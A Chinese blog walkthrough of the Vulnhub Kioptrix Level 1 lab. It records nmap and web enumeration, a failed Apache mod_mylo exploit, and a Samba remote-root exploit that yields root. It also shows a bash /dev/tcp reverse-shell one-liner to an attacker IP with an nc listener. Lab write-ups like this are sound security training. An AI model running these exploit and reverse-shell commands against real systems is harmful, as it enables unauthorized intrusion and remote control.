---
title: Vulnhub-KioptrixLevel1通关记录
tags:
  - 靶场
  - Kioptrix
  - vulnhub
  - WriteUp
categories: WriteUp
keywords: vulnhub
description: 本文记录了作者在通关vulnhub靶机Kioptix Level1中遇到的问题以及踩坑后的解决方案。涉及smb爆破，终端稳定性提高等有效操作。
cover: https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg
top_img: https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg
date: 2023-10-27 10:45:07
---


## 靶机描述

靶机 IP :  10.8.12.128

>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## 信息收集

### nmap扫描

按照常规的方法：通过 TCP | UDP 扫描端口、获取开放端口对应信息、系统版本信息

下面是通过 TCP 扫描发现所收集到的信息：

```
$ sudo nmap -sT -p- --min-rate 10000 10.8.12.128 -oN nmapscan/portscan.txt
Nmap scan report for 10.8.12.128
Host is up (0.00067s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm

$ sudo nmap -sT -p22,80,111,139,443,1024 -sV -sC -O --min-rate 10000 10.8.12.128 -oN nmapscan/servscan.txt
.......
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
.......

```

根据 `nmap` 的扫描结果，可以看到靶机开放了22，80，111，139，443，1024端口，对应的服务分别为 ssh ，web ， smb ，rpc<sup>[①](#RPC协议)</sup>。 

### Web 目录扫描

```
/.html                (Status: 403) [Size: 269]
/index.html           (Status: 200) [Size: 2890]
/test.php             (Status: 200) [Size: 27]
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
```

## 获取立足点

### 失败尝试：绕过 `127.0.0.1` 限制

因为看到如下提示，就在想能不能用绕过的方式，访问到 `127.0.0.1` 的资源，期间尝试了以下几种方法：

1. 添加 `x-forward-for` 头，但是依旧重定向到 `127.0.0.1` ；
2. 通过 SSRF 的方式绕过，但未找到可利用的文件；

### 失败尝试：Apache 1.3.20 RCE

通过 `searchsploit` 查询到 `Apache 1.3.20` 存在 RCE 漏洞，将对应的脚本 `67.c` 复制到本地后进行使用 `gcc` 编译，但编译后爆破攻击失败。

```
$ searchsploit Apache 1.3

.....
Apache 1.3.x mod_mylo - Remote Code Execution | multiple/remote/67.c 
.....

$ searchsploit -m 67.c
  Exploit: Apache 1.3.x mod_mylo - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/67
     Path: /usr/share/exploitdb/exploits/multiple/remote/67.c
    Codes: OSVDB-10976, CVE-2003-0651
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/Desktop/BoxWalk/Vulnhub/kioptrix/level1/67.c

$ gcc -o 67 67.c

$ ./67 -h
Apache + mod_mylo remote exploit
By Carl Livitt (carllivitt at hush dot com)

Arguments:
  -t target       Attack 'target' host
  -T platform     Use parameters for target 'platform'
  -h              This help.

Available platforms:
 0. SuSE 8.1, Apache 1.3.27 (installed from source) (default)
 1. RedHat 7.2, Apache 1.3.20 (installed from RPM)
 2. RedHat 7.3, Apache 1.3.23 (installed from RPM)
 3. FreeBSD 4.8, Apache 1.3.27 (from Ports)

$ ./67 -t 10.8.12.128 -T 1
[-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...
[*] Bruteforce failed....

Have a nice day!
```

### smb攻击

发现靶机开放了139端口，使用 `msf` 对 smb 服务进行攻击。

```
$ searchsploit samba | grep 10.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c

$ ./a.out -b0 10.8.12.128
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
tty
not a tty
```

尝试的是将反弹的shell升级为完整的TTY（交互式shell），直接再shell中再次发起回连，然后在攻击机上使用 `rlwrap` 监听。

```
# target
/bin/bash -i >& /dev/tcp/192.168.213.129/10234 0>&1
```

```
# kali
$ rlwrap nc -lvnp 10234                                             
listening on [any] 10234 ...
connect to [192.168.213.129] from (UNKNOWN) [192.168.213.128] 1026
bash: no job control in this shell
[root@kioptrix tmp]#  
```

虽然仍然不是完整的TTY，但是支持用方向键查看历史记录了，并且用户权限为root权限，测试结束。
## 总结

这个靶机比较简单，来源于[@TJ_Null](https://twitter.com/TJ_Null)大神更新的 [NetSecFocus Trophy Room(Oct 12, 2023)](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?pli=1#gid=998752843)。比较费时的是之前的两次失败尝试，让我在简单靶机上耽搁和浪费了不少时间。

总而言之，在渗透过程中，攻击者应该做好攻击向量的资源分配，以免出现事半功倍的情况。
## 注释

### RPC协议

>RPC（ Remote Procedure Call ）远程过程调用协议，一种通过网络从远程计算机上请求服务，而不需要了解底层网络技术的协议。RPC 它假定某些协议的存在，例如 TPC / UDP 等，为通信程序之间携带信息数据。在 OSI 网络七层模型中，RPC 跨越了传输层和应用层，RPC 使得开发，包括网络分布式多程序在内的应用程序更加容易。

![RPC流程图](https://pic.imgdb.cn/item/64a6d7c41ddac507ccd18b65.jpg)

### CGI 定义

>CGI 目前由NCSA维护，NCSA 定义 CGI 如下：
>
>CGI ( Common Gateway Interface ) ，通用网关接口，它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端 HTML 页面的接口。

CGI 工作流程（用户在网页上点击一个链接或URL）：

1. 使用你的浏览器访问URL并连接到HTTP web 服务器。
2. Web服务器接收到请求信息后会解析URL，并查找访问的文件在服务器上是否存在，如果存在返回文件的内容，否则返回错误信息。
3. 浏览器从服务器上接收信息，并显示接收的文件或者错误信息。

CGI 程序可以是 Python 脚本，PERL 脚本，SHELL 脚本，C 或者 C++ 程序等。

![CGI架构图](https://pic.imgdb.cn/item/64a6ef551ddac507cc075799.jpg)